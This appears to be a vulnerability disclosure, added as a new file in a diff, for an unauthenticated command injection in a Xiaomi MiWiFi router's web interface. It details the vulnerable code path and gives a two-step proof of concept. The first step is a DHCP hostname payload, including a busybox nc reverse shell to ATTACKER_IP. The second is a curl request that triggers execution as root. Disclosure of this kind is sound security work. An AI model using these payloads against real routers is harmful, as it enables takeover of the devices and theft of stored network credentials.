@@ -1,0 +1,24 @@
+Xiaomi MiWiFi R1350 (AIoT Router AC1200) firmware version 1.0.31 contains an unauthenticated operating system command injection vulnerability (CWE-78) in the web management interface.
+
+Vulnerable component: the LuCI controller /usr/lib/lua/luci/controller/api/misns.lua, function snsInit(), exposed without authentication at GET /cgi-bin/luci/api/misns/sns_init (the route is registered with the no-authorization flag 0x01, which bypasses the session check in the dispatcher).
+
+Root cause: the attacker-controlled DHCP client hostname (DHCP option 12) is stored verbatim by dnsmasq into /tmp/dhcp.leases and read back unfiltered via XQDeviceUtil.getDHCPDict() (line 106). The hostname is then interpolated into a double-quoted shell command with no escaping (line 107):
+
+  cmd = string.format("matool --method enc --params \"{\\\"mac\\\":\\\"%s\\\",\\\"dhcp\\\":\\\"%s\\\"}\"", mac, dhcp)
+  LuciUtil.exec(cmd)   -- io.popen -> /bin/sh -c
+
+Because the value sits inside double quotes, $(...), backticks and ${...} are expanded by the shell. The sibling controller api/miats.lua sanitizes equivalent parameters with XQFunction._cmdformat(); misns.lua omits this call.
+
+Exploitation conditions: the attacker only needs to be a LAN client that has obtained a DHCP lease from the router (default for any client joining the network). No authentication, no admin password knowledge, and no initialized/uninitialized state requirement. The injected hostname must not contain whitespace; ${IFS} substitutes spaces.
+
+Impact: arbitrary command execution as root (the fastcgi-spawned Lua backend runs as root), full device compromise, theft of stored PPPoE/Wi-Fi credentials, persistent backdoors, DNS hijacking and pivoting into the internal network.
+
+PoC (two steps):
+1) Obtain a DHCP lease with hostname set to the payload, e.g.
+   $(id>/tmp/pwned)
+   or for a reverse shell (busybox nc has no -e):
+   $(tail${IFS}-f${IFS}/dev/null|nc${IFS}ATTACKER_IP${IFS}7411|/bin/sh|nc${IFS}ATTACKER_IP${IFS}7412)
+2) From the same machine, trigger:
+   curl -s "http://ROUTER_IP/cgi-bin/luci/api/misns/sns_init?callback=poc"
+
+Verification: dynamically confirmed against the firmware emulated with qemu-mips (user mode) + chroot running the original nginx -> fcgi-cgi -> LuCI stack: the planted hostname was executed by /bin/sh with root privileges (uid=0 evidence file created) and an interactive root reverse shell was obtained on the attack host. The HTTP response may return an error or hang when a persistent payload is used; this does not indicate failure, as command execution happens before the response is generated.
